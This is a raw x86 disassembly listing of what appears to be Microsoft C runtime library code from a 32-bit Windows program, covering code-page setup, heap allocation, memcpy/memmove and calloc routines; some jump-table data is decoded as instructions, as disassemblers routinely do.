  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
